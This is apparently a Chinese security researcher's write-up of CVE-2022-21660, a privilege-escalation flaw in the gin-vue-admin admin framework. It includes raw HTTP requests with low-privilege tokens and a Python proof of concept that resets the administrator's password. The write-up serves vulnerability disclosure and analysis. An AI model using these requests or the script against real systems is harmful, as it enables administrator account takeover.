# Gin-Vue-admin垂直越权漏洞与代码分析-CVE-2022-21660
### 一、前言

欢迎各位大佬们给该项目点一个start

```http
https://github.com/flipped-aurora/gin-vue-admin/
```

![image-20211230151736779](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20211230151736779.png)

文章写完了之后，申请CVE有一些麻烦，不过好在还是申请到了，github的员工响应迅速

> ps 申请CVE前，已经提交了CNVD

![image-20220107161655217](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20220107161655217.png)

### 二、环境搭建

按照官方教程

```bash
git clone https://github.com/flipped-aurora/gin-vue-admin.git
```

随后进入server目录

```bash
go generate
```

![image-20211230134341075](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20211230134341075.png)

```bash
go build -o server main.go 
```

随后直接运行server即可

![image-20211230134411233](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20211230134411233.png)

随后是WEB，进入到web目录，输入

```bash
cnpm install || npm install
```

随后等待即可

![image-20211230134632959](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20211230134632959.png)



随后安装完成会自动打开WEB网页

![image-20211230135126848](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20211230135126848.png)

![image-20211230135135212](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20211230135135212.png)

随后初始化设置数据库信息

![image-20211230135407388](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20211230135407388.png)

配置好之后点击初始化后登录即可

![image-20211230135437587](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20211230135437587.png)

### 三、漏洞复现

### SetUserInfo存在垂直越权

##### 1、SetUserInfo接口越权设置用户个人信息

我们直接来到用户管理页面，新增一个低权限的用户角色

![image-20211230143853535](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20211230143853535.png)

可以看到上方并没有给到管理员的权限，接下来新建一个账号，分给这个角色组

![image-20211230144026344](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20211230144026344.png)

![image-20211230144005936](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20211230144005936.png)

漏洞发生的位置在https://github.com/flipped-aurora/gin-vue-admin/blob/master/server/api/v1/system/sys_user.go的第273行

![image-20211230141604735](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20211230141604735.png)

```go
// @Tags SysUser
// @Summary 设置用户信息
// @Security ApiKeyAuth
// @accept application/json
// @Produce application/json
// @Param data body system.SysUser true "ID, 用户名, 昵称, 头像链接"
// @Success 200 {string} string "{"success":true,"data":{},"msg":"设置成功"}"
// @Router /user/setUserInfo [put]
func (b *BaseApi) SetUserInfo(c *gin.Context) {
	var user system.SysUser
	_ = c.ShouldBindJSON(&user)
	if err := utils.Verify(user, utils.IdVerify); err != nil {
		response.FailWithMessage(err.Error(), c)
		return
	}
	if err, ReqUser := userService.SetUserInfo(user); err != nil {
		global.GVA_LOG.Error("设置失败!", zap.Error(err))
		response.FailWithMessage("设置失败", c)
	} else {
		response.OkWithDetailed(gin.H{"userInfo": ReqUser}, "设置成功", c)
	}
}
```

这里没有对传入的ID进行校验，ID代表用户的，直接传入指定的ID就可以修改对应用户的个人信息

![image-20211230141732113](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20211230141732113.png)

首先我们用管理员的X-token测试修改ID为1的用户的名称修改为test1，随后我们可以在后台中看到管理员的ID已经被修改为test1了

![image-20211230144216099](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20211230144216099.png)

那么接下来，我们使用刚刚新建的UzJu_HxSecTeam账号的Token替换进去，将管理员用户名修改为test2

首先我们UzJu_HxSecTeam的账号个人信息>修改密码 这里随便修改密码，然后获取到账号Token

![image-20211230144321622](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20211230144321622.png)

这个Token是低权限那个角色的，正常低权限的用户是不可以修改管理员的任何信息的

```http
x-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJVVUlEIjoiYTM1NTRiYmYtYzQwNS00ZWEwLTkzZjQtMzQ1YTRiNzIxMWYxIiwiSUQiOjMsIlVzZXJuYW1lIjoiVXpKdV9IeFNlY1RlYW0iLCJOaWNrTmFtZSI6IlV6SnVfSHhTZWNUZWFtIiwiQXV0aG9yaXR5SWQiOiIxMjM0IiwiQnVmZmVyVGltZSI6ODY0MDAsImV4cCI6MTY0MTQ1MDk5OCwiaXNzIjoicW1QbHVzIiwibmJmIjoxNjQwODQ1MTk4fQ.0vm9DA7RHOi-ZBN6p-C4RIjJS7Qs9kbXKLNpmc6nyDs
```

我们将Token替换进去，构造如下Json数据

```json
{
  "id":1,
  "username":"test2",
  "nickName":"test2",
  "headerImg":""
}
```

![image-20211230144527291](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20211230144527291.png)

我们将Token替换到setUserinfo接口

```http
PUT /api/user/setUserInfo HTTP/1.1
Host: localhost:8080
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:95.0) Gecko/20100101 Firefox/95.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/json
x-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJVVUlEIjoiYTM1NTRiYmYtYzQwNS00ZWEwLTkzZjQtMzQ1YTRiNzIxMWYxIiwiSUQiOjMsIlVzZXJuYW1lIjoiVXpKdV9IeFNlY1RlYW0iLCJOaWNrTmFtZSI6IlV6SnVfSHhTZWNUZWFtIiwiQXV0aG9yaXR5SWQiOiIxMjM0IiwiQnVmZmVyVGltZSI6ODY0MDAsImV4cCI6MTY0MTQ1MDk5OCwiaXNzIjoicW1QbHVzIiwibmJmIjoxNjQwODQ1MTk4fQ.0vm9DA7RHOi-ZBN6p-C4RIjJS7Qs9kbXKLNpmc6nyDs
x-user-id: 1
Content-Length: 67
Origin: http://localhost:8080
Connection: close
Referer: http://localhost:8080/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

{"id":1,
"username":"test2",
"nickName":"test2",
"headerImg":""}
```

随后提示我们，设置成功

![image-20211230144654682](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20211230144654682.png)

这是我们切换到管理员账号，查看是否被修改为test2

![image-20211230144727266](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20211230144727266.png)

可以看到管理员用户成功被修改

##### 2、SetUserInfo接口垂直越权无条件修改管理员密码

在Debug的时候发现，在越权设置个人信息的接口setUserInfo中不单单只能设置id, username, nickname,headimg，其实还可以传入password等参数

![image-20211230222713086](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20211230222713086.png)

比如我们构造一个请求，将ID为1的用户名称设置为admin，昵称设置为超级用户管理员 

![image-20211230222755083](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20211230222755083.png)

```http
PUT /api/user/setUserInfo HTTP/1.1
Host: localhost:8080
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:95.0) Gecko/20100101 Firefox/95.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/json
x-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJVVUlEIjoiZjkwNjRhMWItNzU2Yi00NTNjLTlkNDAtOWZlZmY5OWI2ZTUxIiwiSUQiOjMsIlVzZXJuYW1lIjoiVXpKdV9IeFNlY1RlYW0iLCJOaWNrTmFtZSI6IlV6SnVfSHhTZWNUZWFtIiwiQXV0aG9yaXR5SWQiOiIxMjM0IiwiQnVmZmVyVGltZSI6ODY0MDAsImV4cCI6MTY0MTQ1Nzc1NywiaXNzIjoicW1QbHVzIiwibmJmIjoxNjQwODUxOTU3fQ.rHCKW7c2kIsaCRKsgI1Nizu18dGKfsOH_m_dW59cY9U
x-user-id: 1
Content-Length: 91
Origin: http://localhost:8080
Connection: close
Referer: http://localhost:8080/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

{"id":1,
"username":"admin",
"nickName":"超级用户管理员",
"Password":"qwe@123"
}
```

此时管理员的密码已经被修改为了qwe@123，尝试登陆

![image-20211230222853109](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20211230222853109.png)

随后成功登录

![image-20211230222906607](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20211230222906607.png)

### ChangPassword越权修改用户密码

> PS: 这里有一个前提，需知道我想修改的那个人用户的密码才可以

首先我们知道默认的admin密码为123456，这个时候我们只需要构造Json数据，将Json数据中的username参数，修改为我们想越权修改的那个用户名即可

首先我们登录低权限的账号，修改一次密码

![image-20211230145433929](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20211230145433929.png)



我们会抓到一个changePassword的请求，随后将这个请求放入Repeater

![image-20211230145506647](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20211230145506647.png)

随后我们只需要将username这个参数修改为admin即可

![image-20211230145615220](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20211230145615220.png)

随后会提示我们修改成功，然后我们使用新的密码来登录admin

![image-20211230145704428](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20211230145704428.png)

随后成功登录

![image-20211230145725332](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20211230145725332.png)

漏洞出现的位置在https://github.com/flipped-aurora/gin-vue-admin/blob/master/server/api/v1/system/sys_user.go，139行

```go
// @Tags SysUser
// @Summary 用户修改密码
// @Security ApiKeyAuth
// @Produce  application/json
// @Param data body systemReq.ChangePasswordStruct true "用户名, 原密码, 新密码"
// @Success 200 {string} string "{"success":true,"data":{},"msg":"修改成功"}"
// @Router /user/changePassword [post]
func (b *BaseApi) ChangePassword(c *gin.Context) {
	var user systemReq.ChangePasswordStruct
	_ = c.ShouldBindJSON(&user)
	if err := utils.Verify(user, utils.ChangePasswordVerify); err != nil {
		response.FailWithMessage(err.Error(), c)
		return
	}
	u := &system.SysUser{Username: user.Username, Password: user.Password}
	if err, _ := userService.ChangePassword(u, user.NewPassword); err != nil {
		global.GVA_LOG.Error("修改失败!", zap.Error(err))
		response.FailWithMessage("修改失败，原密码与当前账户不符", c)
	} else {
		response.OkWithMessage("修改成功", c)
	}
}
```

> 这里有一个争议，就是既然都知道了别人的账号密码，直接登录他的账号不就可以了吗，确实是这样的，但是我们这里的程序逻辑流程是，我们已经鉴权完毕了，正常来说我当前用户也只能修改当前用户的一个密码，可是这里可以通过修改ID来修改别人的，换个角度想也是暴力破解了可以，因为登录页面是有验证码校验的。

### 四、漏洞原理分析

> ps: 以下所有内容出自一个完全没学过Go的，也没做过开发的，只会Python的脚本小子的理解

首先从正常的业务逻辑来看这里为什么会造成越权，其实原理比较简单，主要是因为，我们在新建角色权限的时候，有几个必选的参数，也就是这几个参数，选了之后，用户才有机会越权（但是也不能不选，因为这是默认的必选参数），其实最终还是在代码上存在逻辑问题。

![image-20211230162340184](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20211230162340184.png)

首先我们看，在新建完角色之后，查看角色的权限

![image-20211230162510272](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20211230162510272.png)

可以看到，默认新建的用户权限，在角色菜单中，只有一个可以访问仪表盘的权限，但是我们查看角色的API权限就会发现

![image-20211230162602998](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20211230162602998.png)

这里有几个必选的权限

+ 用户注册
+ 设置用户信息
+ 获取自身信息
+ 修改密码
+ 修改用户角色

这也是这一次漏洞的来源，首先是设置用户信息，如果我们取消勾选

![image-20211230162752207](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20211230162752207.png)

然后我们将低权限角色组的账号Token放进Burp进行尝试

![image-20211230163029027](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20211230163029027.png)

```http
PUT /api/user/setUserInfo HTTP/1.1
Host: localhost:8080
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:95.0) Gecko/20100101 Firefox/95.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/json
x-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJVVUlEIjoiZjkwNjRhMWItNzU2Yi00NTNjLTlkNDAtOWZlZmY5OWI2ZTUxIiwiSUQiOjMsIlVzZXJuYW1lIjoiVXpKdV9IeFNlY1RlYW0iLCJOaWNrTmFtZSI6IlV6SnVfSHhTZWNUZWFtIiwiQXV0aG9yaXR5SWQiOiIxMjM0IiwiQnVmZmVyVGltZSI6ODY0MDAsImV4cCI6MTY0MTQ1Nzc1NywiaXNzIjoicW1QbHVzIiwibmJmIjoxNjQwODUxOTU3fQ.rHCKW7c2kIsaCRKsgI1Nizu18dGKfsOH_m_dW59cY9U
x-user-id: 1
Content-Length: 83
Origin: http://localhost:8080
Connection: close
Referer: http://localhost:8080/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

{"id":1,
"username":"admin",
"nickName":"超级用户管理员",
"headerImg":""}
```

可以很清楚的看到，目前我们已经没有权限来设置这些用户信息了，而且在Go的Debug页面我们也很容易发现，代码逻辑，比如我们现在是没有权限进行设置用户信息的，但是在代码中理论来说，我访问了这个接口，我Debug的断点应该是可以拦截的，但是如下图，我下断点之后，程序居然没有停止

![image-20211230163258163](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20211230163258163.png)

从这里就能判断，在此操作之前，应该是有一个鉴权操作（常见的应该是rbac吧）那么我们现在给低权限角色组设置用户的权限，我们再进行重放看看

![image-20211230163401844](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20211230163401844.png)

![image-20211230163437975](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20211230163437975.png)

我们可以看到，程序成功停止在了这里，那么我想(go小白)应该可以通过Debug的方式，来找到这里的鉴权：）

首先Mac下command键鼠标左键来找哪里调用了这个函数

![image-20211230172215924](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20211230172215924.png)

然后可以看到这里有一个初始化用户路由的一个函数InitUserRouter

![image-20211230172303694](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20211230172303694.png)

那么继续老办法，Command+鼠标左键来判断哪里调用了InitUserRoute

![image-20211230172756447](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20211230172756447.png)

这里注意，有一个JWTAuth()还有一个middleware.CasbinHandler()

首先我们先来看middleware.JWTAuth()，还是老方法Command+鼠标左键

![image-20211230173029571](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20211230173029571.png)

然后来到一个jwt.go，这里的逻辑我们可以看一下（当然也感谢作者写了一些注释)

![image-20211230173337186](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20211230173337186.png)

go中token:=应该是相当于定义一个变量来接收请求中的header中的x-token，首先就是判断token是不是为空，如果为空的话直接返回用户未登录或非法访问

![image-20211230173515740](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20211230173515740.png)

随后就是判断用户的token是否在黑名单里面，这里应该是通过缓存或者用户退出的时候来判断，这个token是不是已经失效了吧，如果失效了就会返回告诉用户异地登录或令牌失效了

![image-20211230173927005](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20211230173927005.png)

这里首先传给ParseToken这个函数来解析Token，可以跟过去看一下

![image-20211230174153376](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20211230174153376.png)

不懂jwt.ParseWithClaims是啥。。。传统艺能，google.com

![image-20211230174335903](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20211230174335903.png)

> https://www.cnblogs.com/taoshihan/p/15239208.html

~~这里是用来JWT加解密的，然后返回一个SigningKey，然后继续往下走~~

感谢作者的指点：此处将传入的jwt token串进行解析，获得jwt.Token结构体，然后从结构体解析出Claims获取之前我们生成token时挂载在上面的用户信息。

![image-20211230180325474](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20211230180325474.png)

通过Google知道了ValidationErrorMalformed用来判断是否是错误的token，然后再通过ValidationErrorExpired来判断是否已过期，然后再通过ValidationErrorNotValidYet判断token是否激活，然后就是返回了。虽然下面还有一段代码

![image-20211230181012200](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20211230181012200.png)

随后判断token是否过期，如果没有过期，则走到了reload，随后我们来到middleware.CasbinHandler()

![image-20211230181206422](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20211230181206422.png)

首先进入到utils.GetClaims并且传入一个参数

![image-20211230181333671](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20211230181333671.png)

这里函数用来获取x-token随后解析该token来判断是否过期等

![image-20211230185043326](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20211230185043326.png)

随后判断用户的角色，这里的1234，也就是我们web设置的角色组ID

![image-20211230185135662](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20211230185135662.png)

![image-20211230185217506](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20211230185217506.png)

随后进入casbinService.Casbin()，传统艺能，直接百度

![image-20211230185413430](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20211230185413430.png)

跟之前猜想的差不多，rbac权限控制，这里是连接数据库，然后这里F7单步步入看了一下，劝退了，看不懂

![image-20211230191210935](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20211230191210935.png)

看注释可以判断，这里用来判断权限

> 机翻： Enforce decides whether a "subject" can access a "object" with the operation "action", input parameters are usually: (sub, obj, act).
>
> 强制决定“subject”是否可以通过操作“action”访问“object”，输入参数通常是:(sub, obj, act)。

![image-20211230191631807](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20211230191631807.png)

随后判断是否在开发环境，然后success等于false，这里|| 或者的意思，要么成功，要么提示权限不足

我们来看看有权限后，越权的setuserinfo接口是怎么走的，首先我们在拦截器这个地方下一个断点

![image-20211230214215348](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20211230214215348.png)

> Tips: 通过百度发现这里用的是golang的casbin访问控制框架
>
> https://blog.csdn.net/qq_42015552/article/details/104013264

然后在setuserinfo这里也下一个断点

![image-20211230214247389](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20211230214247389.png)

因为拦截器在程序逻辑中在setuserinfo前面，所以我们从拦截器开始调

burp发送请求之后，一直等待，此时我们单步调试看看

![image-20211230214329911](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20211230214329911.png)

此时我们的角色组为1234

![image-20211230214503883](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20211230214503883.png)

随后是连接数据库，再之后就是检查权限

![image-20211230215514485](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20211230215514485.png)

![image-20211230215532447](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20211230215532447.png)

这里返回了一个true，说明权限存在，随后就是判断是否为开发环境或者success等于true了，这里肯定会经过第一个if，

随后就来到了setuserinfo接口

![image-20211230220206889](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20211230220206889.png)

shouldBindJson 绑定了Json参数

![image-20211230220707383](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20211230220707383.png)

随后这里，应该是用来判断传入的Json参数是否正确

![image-20211230221153338](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20211230221153338.png)

下面直接直接将userid代入了进去

![image-20220104134548099](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20220104134548099.png)

这里的ID是我们前端传入的，可以任意修改，所以就导致了越权

![image-20211230221415677](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20211230221415677.png)

![image-20211230221432290](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20211230221432290.png)

随后代入到数据库之后，更新后返回

![image-20211230221556509](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20211230221556509.png)

随后则是更新成功

主要的鉴权操作都在cashbin.rbac.go这个文件中的CasbinHandler函数，中的casbinService.Casbin()和e.Enforce(sub, obj, act)

我对这里的越权理解是，如果给了设置用户信息的权限，那么默认这个用户在权限规则中就可以修改用户信息，然后在修改的时候，替换成别人的ID即可修改为别人的

到这里可以明白了，首先鉴权判断的是AuthorityId，来判断用户是否有权限操作某个接口

![image-20220104131901466](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20220104131901466.png)

但是在setuserinfo使用的ID却是用户的账号ID

![image-20220104132137472](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20220104132137472.png)

所以就导致了越权，因为这个ID可以前端传入的时候可以控制，并且也已经鉴权之后了，在与作者沟通之后，解释说修复也比较简单，只需要将user.id强制赋值为JWT所对应的权限ID即可，这样就不会造成越权了，因为前端怎么传入，最终在代码中还是有一行会将user.id的值修改为当前JWT所对应的id

但是在业务流程逻辑中，这些权限又是必须给的，因为不给的话，当前用户是没有办法修改自己的信息的

![image-20220104135624752](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20220104135624752.png)

### 五、POC编写

```python
#!/usr/bin/env python
# -*- coding: UTF-8 -*-
'''
@Project ：UzJuSecurityTools 
@File    ：Gin-Vue-Admin-Poc.py
@Author  ：UzJu
@Date    ：2021/12/31 11:20 
@Email   ：UzJuer@163.com
'''

import requests
import json
import sys


class GinVueAdminPoc:
    def __init__(self, url, token):
        self.url = url
        self.jwt_token = token
        '''
        define vuln interface
        '''
        # Method PUT Severity High
        self.setUserInfo = "/api/user/setUserInfo"
        # Method POST Severity Moderate
        self.changePassword = "/api/user/changePassword"

    def checkVuln(self):
        '''
        因为默认管理员的用户ID为1，所以，这里直接修改ID为1的用户账号为admin，密码为qwe@123
        在实际使用中，可以通过遍历ID，来判断哪个ID用户存在，不过默认用户在实战中应该都是存在的
        The default user ID of the administrator is 1. Therefore, change the account of user 1 to admin and the password to qwe@123
        In practice, you can check which ID exists by iterating through the ID, but the default user should exist in practice
        '''
        payload_data = {
                            "id": 1,
                            "username": "admin",
                            "nickName": "超级管理员",
                            "Password": "qwe@123"
                        }
        # Change the administrator password to qwe@123, because the default administrator ID is 1
        headers = {
            "x-token": self.jwt_token
        }
        result = requests.put(url=self.url + self.setUserInfo,
                              headers=headers,
                              data=json.dumps(payload_data)
                              )
        if json.loads(result.content)['code'] == 7:
            print("[-]Modify the failure")
        elif json.loads(result.content)['code'] == 0:
            print(f"[+]Modify the success, Account: {payload_data['username']}, password: {payload_data['Password']}")

    def check_interface_ChangePassword(self):
        '''
        wait
        '''
        pass


if __name__ == '__main__':
    try:
        Banner_2 = '''
    
         /$$   /$$              /$$$$$          
        | $$  | $$             |__  $$          
        | $$  | $$ /$$$$$$$$      | $$ /$$   /$$
        | $$  | $$|____ /$$/      | $$| $$  | $$
        | $$  | $$   /$$$$/  /$$  | $$| $$  | $$
        | $$  | $$  /$$__/  | $$  | $$| $$  | $$
        |  $$$$$$/ /$$$$$$$$|  $$$$$$/|  $$$$$$/
         \______/ |________/ \______/  \______/                   
             Autor: UzJu   Email: UzJuer@163.com  GitHub: github.com/uzju  
        '''
        print(Banner_2)
        url = sys.argv[1]
        jwt_token = sys.argv[2]
        main = GinVueAdminPoc(url, jwt_token)
        main.checkVuln()
    except:
        print("[-]please input url and token")
```

为什么check_interface_ChangePassword这个方法没写是因为，这里算是一个暴力破解的一个接口，因为在修改任意用户的密码之前，必须知道需要修改的那个账号的密码，这就像是暴力破解，所以这里并没有写，然后就是checkvuln这个方法，payload_data这个json数据中的id，其实可以任意更改的，也可以写成for循环进行遍历，因为在实际环境中并不确定管理员的ID是否为1，或者说存在恶意破坏的话，也可以造成一定的影响。

![image-20211231143107127](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20211231143107127.png)

### 六、CVE申请

> CNVD的就不用说了吧，肯定也已经提交了，这里申请CVE的。
>
> GitHub代申请编号来的特别快，基本上最多3天，这里是当天提交的次日凌晨就收到了CVE的预分配编号
>
> 以下操作需要联系作者帮你操作，不然没有New Draft security advisory这个按钮

![image-20220107164730550](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20220107164730550.png)

![image-20220107165445797](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20220107165445797.png)

![image-20220107165519396](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20220107165519396.png)

Description写上漏洞的内容，复现过程，POC就行，然后点击create draft security advisory

**由于当时我们是第一次申请这个，犯了一个错误，只列出了一个草稿，并没有请求，导致我们白白等了7天**

![image-20220107165651894](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20220107165651894.png)

写完了一定要拉到下面，去点击request cve id

![image-20220107165714011](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20220107165714011.png)

![image-20220107165744293](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20220107165744293.png)

> 参考文章：https://mp.weixin.qq.com/s/eGjDy20unW-fTiuSOOPgRg

### 七、致谢

+ 作者团队主页：https://github.com/flipped-aurora/
+ 作者的GitHub：https://github.com/piexlmax
+ Gin-vue-admin项目地址：https://github.com/flipped-aurora/gin-vue-admin


